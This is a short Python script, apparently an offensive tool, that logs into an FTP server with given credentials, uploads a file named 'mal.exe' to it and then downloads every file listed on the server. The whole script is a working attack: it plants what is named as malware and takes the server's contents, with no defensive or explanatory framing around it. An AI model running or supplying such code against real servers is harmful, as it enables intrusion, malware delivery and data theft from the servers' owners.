import ftplib, sys, os

def FTPAccess(host, port, user, password):
    server = ftplib.FTP() # initialize FTP server object
    try:
        server.connect(host, port, timeout=5) # Connect to FTP server with a timeout of 5

        server.login(user, password)         # login using the credentials (user & password)
    except ftplib.error_perm:
        return False  # Login failed, wrong credentials
    else:
        print("[+] Login to FTP Server success:", password) # Correct credentials
        print("[+] Listing FTP Directory")
        server.dir()
        with open("mal.exe", "rb") as file:
            print("[+] Attempting to upload to FTP Directory")
            server.storbinary(f"STOR {'mal.exe'}", file)
        server.dir()
        files = []
        files = server.nlst()
        print("[+] Attempting to extract files")
        for file in files:
            try:
                server.retrbinary("RETR " + file ,open(file, 'wb').write)
                print("[+] Extracted files: " + file)
            except:
                pass
        return True

def main(): 
    print("FTP Server Access Automation Script")
    if(len(sys.argv) != 5):
        print("(+) usage: %s <target> <port> <username> <password>" % sys.argv[0])
        print('(+) eg: %s 192.168.121.103' % sys.argv[0])
        sys.exit(-1)
    
    host = sys.argv[1] # hostname or IP address of the FTP server

    port = int(sys.argv[2]) # port of FTP

    user = sys.argv[3] #Username of the FTP Server

    password = sys.argv[4] #Password of the FTP Server
    
    print("[+] Trying credentials:", user, password)

    
    if FTPAccess(host, port, user, password):
        print("Credential Access to FTP Server success")
    else:
        print("Credential Access to FTP Server Unsuccessful")

if __name__ == "__main__":
    main()
